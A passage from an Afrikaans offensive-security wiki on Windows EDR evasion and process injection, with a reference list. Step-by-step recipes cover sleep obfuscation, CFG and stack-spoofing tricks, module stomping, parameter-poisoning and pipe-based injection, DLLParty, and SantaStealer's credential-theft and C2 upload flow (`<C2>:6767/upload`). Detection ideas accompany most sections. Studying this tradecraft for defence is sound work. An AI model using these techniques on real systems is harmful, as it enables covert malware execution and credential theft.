- Vervang hashed export resolution (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte verwysing soos `&WaitForSingleObject`.
- Die compiler genereer ’n IAT-entry, wat interception moontlik maak wanneer die reflective loader imports resolve.

### Ekko-styl sleep/idle-obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitives** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang waits, draai die oproep toe in ’n Ekko-styl obfuscation chain wat die in-memory image tydens idle enkripteer:<sup>[[31]](#references)[[27]](#references)</sup>

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` met opgestelde `CONTEXT`-frames oproep.
- Tipiese chain (x64): stel image op `PAGE_READWRITE` → RC4-enkripteer via `advapi32!SystemFunction032` oor die volledige mapped image → voer die blokkerende wait uit → RC4-dekripteer → **herstel per-section permissions** deur PE-sections te deurloop → dui voltooiing aan.
- `RtlCaptureContext` verskaf ’n `CONTEXT`-sjabloon; kloon dit in verskeie frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap aan te roep.

Operasionele besonderheid: gee “success” vir lang waits terug (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon verberg die module vir scanners gedurende idle-vensters en vermy die klassieke “patched `Sleep()`”-signature.

Opsporingsidees (gebaseer op telemetrie)
- Vurige groepe `CreateTimerQueueTimer`-callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot, aaneenlopende buffers so groot soos ’n image gebruik word.
- Groot `VirtualProtect`-reekse gevolg deur pasgemaakte herstel van per-section-permissions.

### Runtime CFG-registrasie vir sleep-obfuscation-gadgets

Op CFG-enabled teikens sal die eerste indirecte sprong na ’n mid-function-gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die module se CFG-metadata voorkom nie. Om Ekko/Kraken-styl chains binne geharde prosesse aan die gang te hou:<sup>[[30]](#references)</sup>

- Registreer elke indirecte bestemming wat die chain gebruik met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID`-entries.
- Vir adresse binne gelaaide images (`ntdll`, `kernel32`, `advapi32`), moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volledige image size** dek.
- Gebruik eerder die **allocation base** en allocation size vir handmatig gemapte/PIC/stomped-regions.
- Merk nie net die dispatch-gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event-syscalls) en enige uitvoerbare attacker-controlled sections wat indirecte teikens sal word.

Dit verander ROP/JOP-styl sleep chains van “werk net in nie-CFG-prosesse” na ’n herbruikbare primitive vir `explorer.exe`, browsers, `svchost.exe` en ander endpoints wat met `/guard:cf` saamgestel is.

### CET-safe stack spoofing vir slapende threads

Volledige `CONTEXT`-vervanging is opvallend en kan op CET Shadow Stack-stelsels breek omdat ’n gespoofde `Rip` steeds met die hardeware-shadow stack moet ooreenstem. ’n Veiliger sleep-masking-patroon is:<sup>[[30]](#references)</sup>

- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB` / TEB-stackgrense (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Rugsteun die huidige thread se werklike TEB/TIB.
- Vang die werklike slapende context met `GetThreadContext` vas.
- Kopieer **slegs** die werklike `Rip` na die spoof-context en laat die gespoofde `Rsp`/stack state onveranderd.
- Kopieer gedurende die slaapvenster die spoof-thread se `NT_TIB` na die huidige TEB sodat stack walkers binne ’n geldige stack range unwind.
- Herstel ná afloop van die wait die oorspronklike TIB en thread context.

Dit behou ’n CET-konsekwente instruction pointer, terwyl EDR stack walkers mislei word wat TEB-stack-metadata vertrou om unwinds te valideer.

### APC-gebaseerde alternatief: Kraken Mask

As timer-queue-dispatch te herkenbaar is, kan dieselfde sleep-encrypt-spoof-restore-volgorde vanaf ’n suspended helper thread met queued APCs uitgevoer word:<sup>[[27]](#references)</sup>

- Skep ’n helper thread met `NtTestAlert` as entrypoint.
- Queue voorbereide `CONTEXT`-frames/APCs met `NtQueueApcThread` en verwerk hulle met `NtAlertResumeThread`.
- Stoor die chain state op die heap in plaas van die helper stack om te voorkom dat die verstek 64 KB-thread stack uitgeput word.
- Gebruik `NtSignalAndWaitForSingleObject` om die start event atomies aan te dui en te blokkeer.
- Suspend die main thread voordat die TIB/context herstel word (`NtSuspendThread` → restore → `NtResumeThread`) om die race window te verklein waarin ’n scanner ’n half-herstelde stack kan opspoor.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue`-signature met ’n helper-thread/APC-signature, terwyl dieselfde RC4-masking- en stack-spoofing-doelwitte behoue bly.

Bykomende opsporingsidees
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC-dispatch.
- `GetThreadContext`/`SetThreadContext` wat rondom `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe` gebruik word.
- `NtQueryInformationThread` gevolg deur direkte skrywes na die huidige thread se TEB/TIB-stackgrense.
- `NtQueueApcThread`/`NtAlertResumeThread`-chains wat indirek `SystemFunction032`, `VirtualProtect` of helpers vir herstel van section-permissions bereik.
- Herhaalde gebruik van kort gadget-signatures soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch-pivots binne signed modules.


## Precision Module Stomping

Module stomping voer payloads uit die **`.text`-section van ’n DLL wat reeds binne die teikenproses gemap is** uit, in plaas daarvan om ooglopende private executable memory te allokeer of ’n nuwe sacrificial DLL te laai. Die overwrite-teiken moet ’n **gelaaide, disk-backed image** wees waarvan die code space die payload kan akkommodeer sonder om code paths wat die proses nog nodig het, te beskadig.<sup>[[1]](#references)[[2]](#references)</sup>

### Betroubare teikenkeuse

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is broos: die DLL is dalk nie in die remote process gelaai nie, en ’n code region wat te klein is, sal die proses laat crash. ’n Betroubaarder werksvloei is:

1. Lys die teikenproses se modules en hou ’n **name-only-include list** van DLLs wat reeds gelaai is.
2. Bou eers die payload en teken die **presiese byte-grootte** aan.
3. Skandeer kandidaat-DLLs op skyf en vergelyk die PE-section se **`.text` `Misc_VirtualSize`** met die payload-grootte. Dit is belangriker as die lêergrootte omdat dit die grootte van die executable section **wanneer dit in memory gemap is** weerspieël.
4. Parse die **Export Address Table (EAT)** en kies ’n exported function-RVA as die stomp se begin-offset.
5. Bereken die **blast radius**: as die payload die geselekteerde funksiegrens oorskry, sal dit aangrensende exports wat daarna in memory gelê is, oorskryf.

Tipiese recon-/keusehelpers wat in die praktyk voorkom:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasionele notas
- Verkies DLLs wat **reeds gelaai** is in die afgeleë proses om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat die teikentoepassing selde uitvoer; anders kan normale kodepaaie die gestompte grepe voor of ná thread creation raak.
- Groot implants vereis dikwels dat die inbedding van shellcode verander word van ’n string literal na ’n **byte-array/braced initializer**, sodat die volledige buffer korrek in die injector-bronkode voorgestel word.

Opsporingsidees
- Afgeleë skryfbewerkings na image-backed uitvoerbare bladsye (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX-toekenning.
- Export entry points waarvan die grepe in die geheue nie meer ooreenstem met die backing file op skyf nie.
- Remote threads of context pivots wat met uitvoering begin binne ’n wettige DLL-export waarvan die eerste grepe onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)` / `WriteProcessMemory`-reekse teen DLL `.text`-bladsye, gevolg deur thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) is ’n **process-injection / EDR-evasion**-tegniek wat die klassieke remote write path (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om grepe na ’n reeds lopende teiken te kopieer, misbruik dit die feit dat Windows geselekteerde `CreateProcessW`-opstartparameters na die kinderproses **kopieer** en hulle binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.<sup>[[28]](#references)[[29]](#references)</sup>

### Vergiftigbare draers wat deur `CreateProcessW` gekopieer word

Nuttige draers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese beperkings vir draers:

- `lpCommandLine` moet na **skryfbare geheue** wys vir `CreateProcessW`, en is beperk tot **32,767 Unicode-karakters**, insluitend die null-terminator.
- `lpEnvironment` moet ’n Unicode-omgewingsblok wees met opeenvolgende `NAME=VALUE\0`-stringe wat deur ’n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, dus moet die `ShellInfo`-kartering as ’n implementeringsdetail beskou word, nie as ’n stabiele gedokumenteerde kontrak nie.

Dit verander normale proseskepping in die **payload-oordragprimitief**. Die operateur skep die kinderproses met aanvallerbeheerde opstartdata en laat Windows die kopie tussen prosesse uitvoer.

### Remote lookup-vloei sonder remote write-API’s

Nadat die kind geskep is, spoor die gekopieerde buffer op met **slegs-lees**-primitiewe:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die remote `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde wyser:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimale vloei:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Die gekopieerde parameterbuffer uitvoer

Die gekopieerde parametergebied is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3-ketting is:

1. Skep die proses normaalweg (nie opgeskort nie)
2. Maak die gekose parameterbladsy uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die hoofthread-handle wat reeds in `PROCESS_INFORMATION` teruggegee is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread-hijacking-werkvloeie, **vereis dit nie** `SuspendThread` / `ResumeThread` nie; die konteks kan direk op die teruggekeerde hoofthread-handle verander word.

Dit vermy verskeie API’s wat algemeen vir injection gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Nulgreepbeperking en gefaseerde shellcode

Al drie draers is **string- of stringagtige data**, dus word ’n rou payload wat `0x00` bevat tydens oordrag afgekap. ’n Praktiese oplossing is ’n **nulgrepe-vrye eerste fase** wat konstantes tydens looptyd herbou en dan ’n arbitrêre tweede fase laai.

’n Eenvoudige patroon is XOR-gebaseerde konstantesintese:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hiermee kan die eerste fase stack-stringe, API-argumente, DLL-paaie of ’n tweedefase-shellcode loader bou sonder om nulgrepe in die oorgedraagde parameter in te sluit.

### Stack-gebaseerde API-oproepe vanaf die eerste fase

Wanneer die eerste fase API’s soos `LoadLibraryA` moet aanroep, kan dit:

- die string/buffer op die teiken se stack plaas
- die **32-greep x64 shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe wysers stel
- `RSP` **16-greep-belyn** hou voor die oproep

’n Tweedefase kan dan vanaf die stack na ’n `PAGE_READWRITE`-toekenning gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word, en daarheen kan gespring word. Dit vermy ’n direkte RWX-toekenning.

### Opsporingsidees

Goeie opsporingsgeleenthede wat deur die outeurs genoem word:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **prosesparameterbladsye uitvoerbaar maak**
- daardie beskermingsverandering gevolg deur `SetThreadContext` / `NtSetContextThread`
- afgeleë leesbewerkings van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang / hoë-entropie `lpCommandLine`-, `lpEnvironment`- of `STARTUPINFO.lpReserved`-waardes tydens prosesskepping

### Notas

- P3 is ’n **oordragtruuk tussen prosesse**, nie op sigself ’n volledige uitvoeringsprimitief nie: die gekopieerde parameter benodig steeds ’n verandering van uitvoertoestemming en ’n metode om uitvoering daarheen te herlei.
- `RtlCreateProcessReflection` / Dirty Vanity is deur die outeurs oorweeg, maar verwerp omdat dit intern verdagte primitiewe soos `NtWriteVirtualMemory` en `NtCreateThreadEx` aanroep.

## Console STDIN pipe injection

’n Interaktiewe konsolekindproses kan ook as die **payload-oordragprimitief** gebruik word. Die injector herlei die kindproses se standaardinvoer na ’n pyp en stuur ’n merker gevolg deur shellcode. Nadat die konsoleprogram die data in sy eie private geheue ingelees het, vind die injector daardie buffer, maak dit uitvoerbaar en herlei ’n kindprosesdraad daarheen. Dit vermy `VirtualAllocEx` en `WriteProcessMemory`, maar dit bly proses-inspuiting eerder as ’n algemene EDR-omseiling.<sup>[[41]](#references)</sup>

Ondanks die beskrywing as ’n "named-pipe", roep die verwysingsimplementering `CreatePipe` aan, wat ’n **anonieme pyp** skep. Windows implementeer anonieme pype intern met uniek benoemde pypobjekte, maar die PoC kies nie ’n `\\.\pipe\<name>`-pad nie en roep ook nie `CreateNamedPipe` aan nie. Dit skep oorerfbare handvatsels met ’n versteksekuriteitsbeskrywer, plaas die leeshandvatsel in `STARTUPINFO.hStdInput`, stel `STARTF_USESTDHANDLES` in en begin ’n nuwe kindproses met handvatseloorerwing geaktiveer. Daarom begin hierdie PoC die verskafde konsoleprogram; dit koppel nie sy pyp aan ’n bestaande proses nie.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Verwysingswerkvloei

Die implementering gebruik die volgende ketting:<sup>[[41]](#references)</sup>

1. Skep anonieme pyp-pare vir die kindproses se `STDIN` en `STDOUT`. Skakel oorerwing vir die twee handvatsels aan die ouerproses se kant af en maak die duplikate aan die kindproses se kant in die ouerproses toe nadat die proses geskep is.
2. Begin ’n interaktiewe uitvoerbare lêer soos `netsh.exe` of `nslookup.exe` met `CREATE_NEW_CONSOLE`. Die kindproses erf die herleide standaardhandvatsels.
3. Stuur die volledige binêre `rawData`-skikking met `WriteFile` deur die `STDIN`-handvatsel aan die ouerproses se kant. Die konsoleprogram verbruik die grepe en laat ’n kopie in een van sy private toegewyde geheuegebiede agter.
4. Loop deur die kindproses se adresruimte met `VirtualQueryEx`, lees kandidaat-`MEM_PRIVATE`-gebiede met `ReadProcessMemory` en soek die merker aan die begin van `rawData`.
5. Verander die ontdekte buffer na `PAGE_EXECUTE_READWRITE` met `VirtualProtectEx`.
6. Identifiseer die hoofdraad, skort dit op, stel `RIP` met `NtSetContextThread` op `found_address + 0x19` en hervat dit.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die verskafde implementering is spesifiek vir x64: dit wysig `CONTEXT.Rip`, en sy ingebedde payload is x64-shellcode. `rawData` begin met ’n merker van 25 grepe, dus begin die uitvoerbare grepe by die heksadesimale offset `0x19`. Wanneer jy die payload vervang, behou daardie uitleg of werk die merker, soekvektor, skikkinggrootte en uitvoeringsoffset saam by. Die bronkommentaar lys ook `0x0A`, `0x0D` en `0x1A` as slegte karakters. Hierdie werkvloei verander nie die kindproses se token of voorregte nie.<sup>[[41]](#references)</sup>

Vir klein native helpers en patrone vir payload-kompilering, sien [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-pool callback DLL-inspuiting sonder shellcode (DLLParty)

DLLParty pas PoolParty-styl thread-pool-inspuiting aan sodat ’n bestaande teiken-worker `LoadLibraryA` aanroep, eerder as om ’n ingespuite callback-stub uit te voer. Die dispatch-primitief daarvan is ’n `TP_DIRECT`-completion wat by die teikenpoel se I/O completion port in die tou geplaas word. Dit omseil nie prosestoestemmings nie: die PoC roep `OpenProcess(PROCESS_ALL_ACCESS)` aan en benodig leesbare/skryfbare teikengeheue, plus dupliseerbare worker-factory- en completion-port-handles.<sup>[[46]](#references)[[47]](#references)</sup>

Op Windows x64 gee die worker ’n wyser na sy stack-gesteunde `TP_CALLBACK_INSTANCE` in `RCX` deur, die eerste callback-argument. `LoadLibraryA` interpreteer dieselfde wyser as ’n `LPCSTR`. Op die getoetste pad bou `TppWorkerThread` die wyser by `RSP+0x178`, terwyl sy eerste gewone skryfhandeling in daardie objek by `RSP+0x1d0` plaasvind. ’n Nulbeëindigde DLL-pad wat binne hierdie voorvoegsel van 0x58 grepe pas, kan dus aan die begin van die instansie geplaas word sonder dat dit voor dispatch oorskryf word. Dit is ’n bou-spesifieke waarneming, nie ’n gedokumenteerde Windows ABI-waarborg nie.<sup>[[46]](#references)[[47]](#references)</sup>

Die verwysingswerkvloei is:<sup>[[46]](#references)[[47]](#references)</sup>

1. Tel die teiken se handles op met `NtQuerySystemInformation(SystemHandleInformation)` en identifiseer `TpWorkerFactory` deur objeksoorte te navraag te doen. Dupliseer ’n worker-factory-handle en navraag doen oor `WorkerFactoryBasicInformation`; `StartParameter` gee die afgeleë `TP_POOL`. Slaan factories met `TotalWorkerCount == 0` oor.
2. Lees `TP_POOL.CompletionPort` en loop deur die poel se private worker-lys. Op die getoetste Windows 10 19045 x64-bou (`ntdll.dll 10.0.19041.4842`) is die kop by `pool+0x60`; elke skakel is by `worker+0x10`, dus is die callback-instance-gleuf by `worker+0x38` gelyk aan `link+0x28`. Die PoC kontroleer wyserbelyning, skakel-onderlinge verwysings, poeleienaarskap, nie-nul thread-ID’s, herhaalde nodusse en ’n stabiele lyskop.
3. Skryf die DLL-pad in **elke** herwonne worker-gleuf, omdat enige worker die completion uit die tou kan haal. Plaas ’n `TP_DIRECT` met `Callback = LoadLibraryA` in skryfbare teikengeheue. Die PoC gebruik `last_slot-0x500` op ’n worker-stack pleks van `VirtualAllocEx`; daardie offset is eksperimenteel en mag nie met aktiewe stack-data bots nie.
4. Dupliseer die teiken se completion-port-handle en roep `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` aan. Die afgeleë `TP_DIRECT`-adres is die completion key. ’n Bestaande worker roep dan `LoadLibraryA` aan met sy oorskryfde callback-instance-wyser en laai ’n DLL wat reeds vir die teiken toeganklik is.

Die PoC ontvang ’n teiken-PID (`DLLParty.exe <target_pid>`) en gebruik ’n hardgekodeerde DLL-pad in `DLLParty.cpp`; stel ’n pad in wat vir die teiken toeganklik is voordat jy ’n x64-uitvoerbare lêer bou. Dit gebruik ook sy eie proses se `LoadLibraryA`-adres as die afgeleë callback, dus aanvaar dit dat daardie adres in die teiken geldig is. Die kode kontroleer nie die padlengte teenoor die voorvoegsel van 0x58 grepe nie, en ook nie of die worker-deurloop ’n gleuf gevind het voordat die laaste element geïndekseer word nie. Valideer die private offsets, stack-uitleg en skryfbare ruimte vir die teikenbou weer. Die weglating van `CreateRemoteThreadEx`, shellcode en `VirtualAllocEx` skakel nie kruisproses-skryfbewerkings of DLL-laai-telemetrie uit nie.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer se Tradecraft vir Fileless-ontduiking en Diefstal van Geloofsbriewe

SantaStealer (ook bekend as BluelineStealer) wys hoe moderne info-stealers AV-bypass, anti-analise en toegang tot geloofsbriewe in een werkvloei kombineer.<sup>[[24]](#references)</sup>

### Sleutelborduitleg-hekstelling en sandbox-vertraging

- ’n Konfigurasievlag (`anti_cis`) tel geïnstalleerde sleutelborduitlegte op via `GetKeyboardLayoutList`. As ’n Cyrilliese uitleg gevind word, skep die sample ’n leë `CIS`-merker en beëindig dit voordat stealers loop. Só ontplof dit nooit in uitgeslote lokaliteite nie, terwyl dit ’n artefak vir opsporing agterlaat.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Gelaagde `check_antivm`-logika

- Variant A loop deur die proseslys, bereken ’n pasgemaakte rollende kontrolesom vir elke naam en vergelyk dit met ingebedde bloklyste vir debuggers/sandboxes; dit herhaal die kontrolesom vir die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B ondersoek stelseleienskappe (minimum aantal prosesse, onlangse bedryfstyd), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox-additions op te spoor en doen tydtoetse rondom slaaptye om single-stepping raak te sien. Enige treffer staak uitvoering voordat modules begin.

### Lêerlose helper + dubbele ChaCha20-reflektiewe laai

- Die primêre DLL/EXE bevat ’n Chromium-aanmeldbesonderhede-helper wat óf na skyf geskryf óf met die hand in die geheue gekarteer word; lêerlose modus los self invoere/herplasings op, sodat geen helper-lêers geskep word nie.
- Dié helper stoor ’n tweede-fase-DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-greep-sleutels + 12-greep-nonces). Ná albei deurgange laai dit die blob reflektief (geen `LoadLibrary` nie) en roep die uitvoere `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, wat van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) afgelei is.<sup>[[25]](#references)</sup>
- Die ChromElevator-roetines gebruik reflektiewe proses-hollowing via direkte syscall om in ’n aktiewe Chromium-blaaier in te spuit, AppBound Encryption-sleutels te erf en wagwoorde/koekies/kredietkaarte direk uit SQLite-databasisse te dekripteer, ondanks ABE-verharding.

### Modulêre insameling in die geheue en HTTP-eksfiltrasie in stukke

- `create_memory_based_log` loop deur ’n globale `memory_generators`-funksiewysertabel en begin een draad per geaktiveerde module (Telegram, Discord, Steam, skermskote, dokumente, blaaieruitbreidings, ens.). Elke draad skryf resultate na gedeelde buffers en rapporteer die aantal lêers ná ’n aansluitingsvenster van ongeveer 45 sekondes.
- Sodra alles klaar is, word dit met die staties gekoppelde `miniz`-biblioteek as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` slaap dan 15 sekondes en stuur die argief in stukke van 10 MB via HTTP POST na `http://<C2>:6767/upload`, terwyl dit ’n blaaier se `multipart/form-data`-grens naboots (`----WebKitFormBoundary***`). Elke stuk bevat `User-Agent: upload`, `auth: <build_id>`, opsioneel `w: <campaign_tag>`, en die laaste stuk voeg `complete: true` by sodat die C2 weet dat die herbouing voltooi is.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)

{{#include ../banners/hacktricks-training.md}}
